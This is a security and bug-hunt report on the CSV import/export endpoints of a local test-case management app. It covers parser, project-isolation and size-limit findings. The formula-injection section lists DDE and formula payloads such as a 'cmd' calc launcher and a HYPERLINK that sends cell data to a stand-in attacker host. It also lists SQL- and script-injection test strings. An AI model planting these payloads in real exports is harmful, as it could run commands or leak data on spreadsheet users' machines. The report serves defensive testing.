# CSV import/export bug hunt

Date: 2026-09-17. Live `http://127.0.0.1:4317` as `demo@topology.local`. Scope: `GET/POST /api/import/csv`, `GET /api/import/csv/template`, and the Cases page CSV menu (`src/components/cases-workspace.tsx`). Imported titles prefixed `BUGHUNT-CSV-`. No code changes, no server restart, no seed/push/migrate.

Projects the session belongs to: Topology `3f0ddc37-b2a9-406a-bcf0-e8e0b4548aaf` (active), Test `8f861e9a-6cdc-4d2d-a1e7-52fdd7de8de7`. Most probes were written to Test so they would not collide with other hunts on Topology. A few isolation markers were written to Topology.

The Cases UI does not parse CSV itself. It `window.open`s the template and export URLs and `POST`s `multipart/form-data` field `file` to `/api/import/csv` (`cases-workspace.tsx:582-593`, `:644-650`). Multipart was exercised directly; the browser file picker was not clicked.

---

## Highest severity

1. **Own export does not round-trip** — the importer splits on newlines before it understands quotes (`src/lib/csv.ts:73-77`). Seed cases with multiline steps (`TOP-1`, `TOP-3`, `TOP-4`) export as quoted RFC CSV and re-import as **400 No valid rows**. A continuation line that looks like a row is inserted as a **different case**, and the source row is dropped, while the response is HTTP 200. The Cases UI treats that as full success.
2. **CSV / DDE formulas are stored and re-exported as formulas** — `=1+1`, `=cmd|'/C calc'!A0`, `+2+2`, `-2+3`, and `@SUM(1+1)` come back unquoted. Leading tab/space (the usual spreadsheet guard) is trimmed off before save, so the export starts with `=`. A folder named `=cmd|'/C calc'!A0` is created and emitted in the folder column.

No cross-workspace leak was observed. An id the session does not belong to is **not** rejected; read and write fall back to the first accessible project (Topology) and return 200.

---

## Confirmed bugs

### 1. Newline-unaware parser breaks export → import, and can create a phantom case

`serializeCasesCsv` quotes fields that contain `\n` (`src/lib/csv.ts:132-135`). `parseCasesCsv` then splits the whole file on `\r?\n` **before** quote handling (`src/lib/csv.ts:73-77`). `splitCsvLine` never sees the closing quote. Missing cells are written as `""` (`src/lib/csv.ts:90-92`), so `priority`/`status` fail the enum instead of defaulting. Continuation lines are parsed as new records.

Live export of the seeded Topology workspace already contains this shape (quoted steps, then bare continuation lines):

```
TOP-4,Execute a manual run,Mark pass/fail on cases inside a run.,A run with attached cases exists.,"1. Open Runs
2. Start run
3. Record results",Run progress updates and statuses persist.,P0,ready,,runs;manual
```

Re-import of that export with keys rewritten to `BUGHUNT-CSV-RT-TOP-1`, `BUGHUNT-CSV-RT-TOP-3`, `BUGHUNT-CSV-RT-TOP-4` (titles prefixed `BUGHUNT-CSV-`), JSON body, project Test:

- HTTP **400**
- `error`: `No valid rows`
- `details`: `Row 2: Invalid option: expected one of "P0"|"P1"|"P2"|"P3"`, then `Row 3: Too small` / `Row 4: Too small`, and the same pattern for the other two cases (rows 5–10)
- `created` absent. Those keys are **not** in a later Test export.

So the product's own sample cases cannot be exported and imported again. Single-line commas and quotes do survive (below).

**Phantom row.** Source row is quoted-broken; the next physical line is a complete record. Posted to Test:

```
key,title,description,preconditions,steps,expectedResult,priority,status,folder,tags
BUGHUNT-CSV-PHANTOM-SRC,BUGHUNT-CSV-phantom source,"line1
BUGHUNT-CSV-PHANTOM,BUGHUNT-CSV-phantom created,from-newline,pre,steps,exp,P0,ready,BUGHUNT-CSV-Folder,tag
```

HTTP **200**, `created: 1`, `errors: ["Row 2: Invalid option: expected one of \"P0\"|\"P1\"|\"P2\"|\"P3\""]`. The only case created was `BUGHUNT-CSV-PHANTOM` / `BUGHUNT-CSV-phantom created` / `P0` / `ready` / description `from-newline`. Re-export contains that key. `BUGHUNT-CSV-PHANTOM-SRC` was not created. The UI ignores `errors` on 200 (`cases-workspace.tsx:588-592`), so this looks like a successful import of the wrong case.

### 2. Formula and DDE payloads are stored and re-exported as formulas

`escape` only quotes `"`, `,`, and `\n` (`src/lib/csv.ts:132-135`). There is no `=`, `+`, `-`, `@`, or tab neutralization. `splitCsvLine` then `trim()`s every cell (`src/lib/csv.ts:45`), which removes a leading space or tab before the value is saved.

Imported into Test (titles prefixed `BUGHUNT-CSV-`). Import JSON returned the payloads unchanged (`created: 12`). Subsequent `GET /api/import/csv` with `x-topology-project-id` Test included these raw lines (not rewritten):

```
BUGHUNT-CSV-INJ-EQ,BUGHUNT-CSV-formula eq,=1+1,,,,P2,draft,BUGHUNT-CSV-Folder,bughunt
BUGHUNT-CSV-INJ-CMD,BUGHUNT-CSV-formula cmd,,,=cmd|'/C calc'!A0,,P2,draft,BUGHUNT-CSV-Folder,bughunt
BUGHUNT-CSV-INJ-DDE,BUGHUNT-CSV-formula dde,=cmd|' /C calc'!A0,,,,P2,draft,BUGHUNT-CSV-Folder,bughunt
BUGHUNT-CSV-INJ-PLUS,BUGHUNT-CSV-formula plus,+2+2,,,,P2,draft,BUGHUNT-CSV-Folder,bughunt
BUGHUNT-CSV-INJ-MINUS,BUGHUNT-CSV-formula minus,-2+3,,,,P2,draft,BUGHUNT-CSV-Folder,bughunt
BUGHUNT-CSV-INJ-AT,BUGHUNT-CSV-formula at,,,,@SUM(1+1),P2,draft,BUGHUNT-CSV-Folder,bughunt
BUGHUNT-CSV-INJ-TAB,BUGHUNT-CSV-formula tab prefix,=1+1,,,,P2,draft,BUGHUNT-CSV-Folder,bughunt
BUGHUNT-CSV-INJ-SPACE,BUGHUNT-CSV-formula space prefix,=1+1,,,,P2,draft,BUGHUNT-CSV-Folder,bughunt
BUGHUNT-CSV-INJ-QUOTED,BUGHUNT-CSV-formula with comma,"=1+1,2",,,,P2,draft,BUGHUNT-CSV-Folder,bughunt
BUGHUNT-CSV-INJ-LINK,BUGHUNT-CSV-formula hyperlink,"=HYPERLINK(""http://evil.example/?x=""&A1,""click"")",,,,P2,draft,BUGHUNT-CSV-Folder,bughunt
BUGHUNT-CSV-INJ-TAG,BUGHUNT-CSV-formula tag,,,,,P2,draft,BUGHUNT-CSV-Folder,=1+1
BUGHUNT-CSV-INJ-FOLDER,BUGHUNT-CSV-formula folder,,,,,P2,draft,=cmd|'/C calc'!A0,bughunt
```

Tab and space prefixes were stripped: both re-exported as bare `=1+1`. The comma formula and `HYPERLINK` are quoted only because they contain `,` / `"`. Excel still treats a quoted cell that starts with `=` as a formula. `GET /api/folders` on Test returned a folder whose name is exactly `=cmd|'/C calc'!A0` (id `0413a5e7-0e46-49ec-a00a-8ba77174a221`). That name is then written into the folder column of every export of cases in that folder.

Opening `topology-cases.csv` in Excel can run these (DDE / `HYPERLINK` often behind a prompt). They are definitely stored and re-exported as formulas, not as neutralized text.

### 3. Unknown project id silently reads and writes the first accessible project

`pickAccessibleProject` falls back to `projects[0]` when the preferred id is not a membership (`src/lib/project.ts:67-81`). CSV GET/POST pass the header through `requireProjectAccess` and do not check that the resolved id equals `x-topology-project-id` (`src/app/api/import/csv/route.ts:16-18`, `:51-57`).

| Request | Result |
| --- | --- |
| `GET /api/import/csv` header `11111111-2222-4333-8444-555555555555` | **200**, body identical to Topology export (same keys, ~2.3MB), not Test, not 403 |
| `GET` with no project header | **200**, same Topology dump (cookie unset; first membership) |
| `GET` header Test | **200**, Test keys only |
| `POST` header `aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee` of `BUGHUNT-CSV-FOREIGN` | **200** `created: 1`, `workspaceId` **`3f0ddc37-b2a9-406a-bcf0-e8e0b4548aaf`** (Topology). Later Topology export contains the key; Test export does not |

This is not a leak of a workspace the user cannot access. It is a wrong-project write/read: a stale or typo'd id succeeds against the oldest membership with no error.

When the header **is** a project the user belongs to, isolation held:

- `BUGHUNT-CSV-ISO-TEST` / description `secret-test-marker-c4e1` imported into Test (`workspaceId` `8f861e9a-…`). Absent from Topology export.
- `BUGHUNT-CSV-ISO-TOP` / `secret-topology-marker-9f3a` imported into Topology. Absent from Test export. Seed key `TOP-1` is not in the Test export.
- Same key `BUGHUNT-CSV-ISO-TEST` also imported into Topology (unique is `(workspaceId, key)`, `src/db/schema.ts:245`). Both rows exist; descriptions differ. Not a cross-write.

No third workspace id was visible. A non-member id could not be tested beyond the bogus UUID, which fell back instead of leaking.

### 4. Blank priority/status on the template header do not default

Schema defaults `P2` / `draft` only when the field is omitted (`src/lib/csv.ts:10-14`). The parser always sets missing cells to `""` (`src/lib/csv.ts:90-92`), and `""` is not in the enum.

| Body | HTTP |
| --- | --- |
| Header `key,title` only, one data row `BUGHUNT-CSV-KT` | **200**, stored `priority: P2`, `status: draft` |
| Full template header, row `BUGHUNT-CSV-ONLYTWO,BUGHUNT-CSV-only key title` | **400** `details: ["Row 2: Invalid option: expected one of \"P0\"\|\"P1\"\|\"P2\"\|\"P3\""]` |
| Explicit blank priority/status | **400**, same message |
| `status: Ready`, `status: ""`, `priority: P9`, `priority: p0` | row rejected (enum is lowercase / `P0`–`P3` only) |
| `status: published` alone | **400** `No valid rows` |

The downloaded template always includes `priority` and `status` (`src/lib/csv.ts:119-130`). A user who leaves those cells blank, which the defaults imply is legal, gets 400 and no row. This is also why the first fragment of a multiline export fails instead of importing with defaults.

### 5. UI treats partial import as success and hides skip/error detail

`importCsv` only surfaces `data.error` when `!res.ok` (`src/components/cases-workspace.tsx:588-592`). It never shows `errors`, `details`, or `skipped`.

- Mixed file (valid `BUGHUNT-CSV-PARTIAL-OK` + `status: nope`): HTTP **200**, `created: 1`, `errors: ["Row 3: Invalid option: expected one of \"draft\"|\"ready\"|\"blocked\"|\"deprecated\""]`. UI refreshes with no error.
- Duplicate key in one file: first row created (`BUGHUNT-CSV-DUP` description `first`), second skipped. A later import of the same key with title `BUGHUNT-CSV-dup UPDATED` and description `updated-body` returned **200** `created: 0`, `skipped: ["BUGHUNT-CSV-DUP"]`. Re-export still has title `BUGHUNT-CSV-dup first` / description `first`. Import never updates. The UI shows nothing.
- Total failure returns 400 `{error, details}` not `{error, errors}`. The UI banner would show only `"No valid rows"`, not `details`.

### 6. Non-JSON POST is an empty 500

If `Content-Type` is not multipart, the handler always calls `request.json()` with no try/catch (`src/app/api/import/csv/route.ts:70-72`).

| Body | Content-Type | HTTP | Body |
| --- | --- | --- | --- |
| raw `key,title\n…` | `text/csv` | **500** | empty (0 bytes, no `content-type`) |
| `not-json` | omitted | **500** | empty |
| `{` | `application/json` | **500** | empty |

Multipart (what the UI sends) is handled. This is an uncaught exception for API clients, not an auth bypass.

### 7. No row or field budget

A 100,000-character description on `BUGHUNT-CSV-HUGE` was stored (`desc_len: 100000`) in 28ms and re-exported at that length. 50 small rows: **200** in 111ms. 2,000 small rows (`BUGHUNT-CSV-B2K-0000` …): **200** `created: 2000` in **3.45s** (~580 rows/s). Linear extrapolation hits the 15s shared-server budget around **~8,700 rows**. A few thousand is accepted. No larger batch was sent. Inserts are one-by-one with a folder lookup, outside a transaction (`src/app/api/import/csv/route.ts:94-145`). There is no max length, max rows, or body cap in this route.

---

## Coverage

| Probe | Result |
| --- | --- |
| Template download | Auth **200** `text/csv; charset=utf-8`, `content-disposition: attachment; filename="topology-cases-template.csv"`. Header `key,title,description,preconditions,steps,expectedResult,priority,status,folder,tags`. Example keys `TOP-20`, `TOP-21`. |
| Template round-trip | Prefixed keys `BUGHUNT-CSV-TPL-TOP-20` / `TOP-21` imported **200** `created: 2`, errors `[]`. Folder `Import` created. Fields match the template (single-line). |
| Export then import (seed multiline) | Export quoting is RFC-valid. Re-import **400**, zero rows. See bug 1. |
| Commas and quotes | `BUGHUNT-CSV-FID-COMMA` title `BUGHUNT-CSV-comma, in title`, description `say "hello", then go` stored and re-exported intact. `BUGHUNT-CSV-FID-QUOTE` title keeps `"in"`. Single-line fidelity holds. |
| Newlines / CRLF inside fields | Not preserved. See bug 1. `BUGHUNT-CSV-FID-NL` and `BUGHUNT-CSV-FID-CRLF` were not created. |
| Leading/trailing spaces | `  padded  ` stored and re-exported as `padded` (`trim` at `csv.ts:45`). |
| Formula / DDE / `@` / `+` / `-` / tab / space / quoted `=` / `HYPERLINK` / formula folder / formula tag | Stored and re-exported as formulas. See bug 2. |
| Empty file, whitespace, headers only | **400** `{error:"No valid rows", details:["CSV must include a header and at least one row"]}`. |
| Wrong columns (`foo,bar`) | **400** `details: ["Row 2: Invalid input: expected string, received undefined"]`. |
| Extra column `owner` | **200**, extra cell ignored, row created (`BUGHUNT-CSV-EXTRA`). |
| Missing title | **400** `No valid rows`. |
| Unknown status `published` / `nope` | Row rejected. Valid sibling still inserted (200). |
| Unknown folder | **200**. Folder `BUGHUNT-CSV-NewFolder-DoesNotExist` created and linked (`folderId` set). Intended by `route.ts:99-106`, but the same path created the formula folder in bug 2. |
| Duplicate key in file | First wins, second `skipped`. No update on a later import. |
| Duplicate key, other workspace | Allowed. Separate rows. |
| Alias headers `id` / `name` | Mapped to `key` / `title` (`csv.ts:52-54`). `BUGHUNT-CSV-ALIAS` created. `notes` ignored. |
| UTF-8 BOM multipart | **200** `BUGHUNT-CSV-BOM` created (`csv.ts:74` strips `\uFEFF`). |
| UTF-16 LE with BOM (`FF FE`) as `cases.csv` | **400** `No valid rows`. Fail closed. Not decoded as UTF-16 (`file.text()` is UTF-8). |
| gzip bytes named `cases.csv` | **400** `No valid rows`. No crash. |
| zip containing `cases.csv`, uploaded as `cases.csv` | **400** `No valid rows`. Inner CSV not extracted. |
| Null byte in title, sibling rows before and after | **200** `created: 2`, `skipped: ["BUGHUNT-CSV-NULL"]`. Before/after rows inserted. No 500. Skip reason is not in `errors` (swallowed by `route.ts:142-144`). |
| SQL-looking key / `<script>` description | Stored literally (`BUGHUNT-CSV-SQLI' OR 1=1--`, description `<script>alert(1)</script>`). Later exports still succeed. Not a SQL break. Browser XSS not exercised (React text nodes; API returned the string). |
| Unauthenticated GET export, GET template, POST import | **307** `location: /login?callbackUrl=…`. Body is the redirect path, not CSV. Middleware (`src/middleware.ts:4-8`) runs before the route's 401 (`route.ts:12-14`, `:47-49`). No data returned. |
| Export data leak | Topology export did not include Test-only markers. Test export did not include `TOP-1` or `BUGHUNT-CSV-ISO-TOP`. Export columns are key, title, description, preconditions, steps, expectedResult, priority, status, folder, tags — no emails or user ids. Topology export was ~2.3MB because that workspace already held a 2,000,000-character description (`TOP-13`); that is same-workspace data, not another tenant. |
| UI import | Same POST the menu uses (multipart `file`). File input `accept=".csv,text/csv"` is client-only; the API does not check the filename (zip/gzip as `cases.csv` still parsed, then rejected). |

---

## Leftover probe data

Left in place. Test project has the `BUGHUNT-CSV-*` cases (including 2,000 `BUGHUNT-CSV-B2K-*` rows, the 100k description, the formula folder, and `BUGHUNT-CSV-PHANTOM`). Topology has `BUGHUNT-CSV-ISO-TOP`, `BUGHUNT-CSV-ISO-TEST` (copy), and `BUGHUNT-CSV-FOREIGN`. Not deleted.

```json
[
  {
    "id": "csv-multiline-roundtrip-and-phantom-row",
    "severity": "high",
    "title": "CSV import splits on newlines before quotes, so the app's own export cannot be re-imported and a continuation line can become a different case",
    "area": "csv-import",
    "file": "src/lib/csv.ts:73",
    "repro_summary": "GET /api/import/csv exports seed steps as quoted multiline fields (TOP-4). POST that CSV back (keys rewritten to BUGHUNT-CSV-RT-TOP-*) returns 400 No valid rows and creates nothing. A quoted newline whose next physical line is a full record returns 200, drops the source row, and creates BUGHUNT-CSV-PHANTOM. The Cases UI ignores errors on 200."
  },
  {
    "id": "csv-formula-injection-reexported",
    "severity": "high",
    "title": "Formula and DDE payloads are stored and re-exported as formulas; leading tab/space guards are trimmed",
    "area": "csv-import",
    "file": "src/lib/csv.ts:132",
    "repro_summary": "POST CSV with description =1+1, steps =cmd|'/C calc'!A0, tags =1+1, and folder =cmd|'/C calc'!A0. GET /api/import/csv writes those cells unquoted. A description of tab+=1+1 or space+=1+1 is re-exported as =1+1. Quoted =HYPERLINK(...) is still a formula when opened in Excel. GET /api/folders shows the DDE string stored as a folder name."
  },
  {
    "id": "csv-foreign-project-id-falls-back",
    "severity": "medium",
    "title": "Unknown x-topology-project-id is not rejected; CSV import and export silently use the first accessible project",
    "area": "csv-import",
    "file": "src/lib/project.ts:72",
    "repro_summary": "GET /api/import/csv with a UUID the user does not belong to returns 200 and the Topology CSV, not 403. POST of BUGHUNT-CSV-FOREIGN with header aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee returns 200 and workspaceId 3f0ddc37-b2a9-406a-bcf0-e8e0b4548aaf. Valid Test vs Topology headers do not leak each other's cases."
  },
  {
    "id": "csv-blank-priority-status-not-defaulted",
    "severity": "medium",
    "title": "Blank priority or status on the template header fails the enum instead of defaulting to P2/draft",
    "area": "csv-import",
    "file": "src/lib/csv.ts:90",
    "repro_summary": "POST the template header plus a row that only has key and title (BUGHUNT-CSV-ONLYTWO). 400 details say priority is not P0|P1|P2|P3. The same row with a header of only key,title returns 200 and stores P2/draft."
  },
  {
    "id": "csv-ui-hides-partial-import",
    "severity": "medium",
    "title": "Cases CSV import treats HTTP 200 as full success and drops errors, details, and skipped keys",
    "area": "csv-import",
    "file": "src/components/cases-workspace.tsx:588",
    "repro_summary": "POST a file with one valid row and one status:nope row. API returns 200 with created:1 and an errors array. importCsv only setErrors when !res.ok, then router.refresh(). Re-importing an existing key returns 200 created:0 skipped:[key] and the stored title is not updated."
  },
  {
    "id": "csv-non-json-empty-500",
    "severity": "low",
    "title": "CSV POST with a non-JSON body returns an empty 500",
    "area": "csv-import",
    "file": "src/app/api/import/csv/route.ts:71",
    "repro_summary": "Authenticated POST /api/import/csv with Content-Type text/csv, or invalid JSON, hits request.json() outside try/catch. Response is HTTP 500 with an empty body. Multipart file uploads are unaffected."
  },
  {
    "id": "csv-no-import-budget",
    "severity": "low",
    "title": "CSV import has no field or row cap; a few thousand rows are inserted sequentially",
    "area": "csv-import",
    "file": "src/app/api/import/csv/route.ts:94",
    "repro_summary": "A 100k-character description is stored and re-exported. 2000 small rows returned 200 created:2000 in 3.45s (~580 rows/s). Extrapolated ~15s around 8700 rows; that larger request was not sent. No size check in the route."
  }
]
```
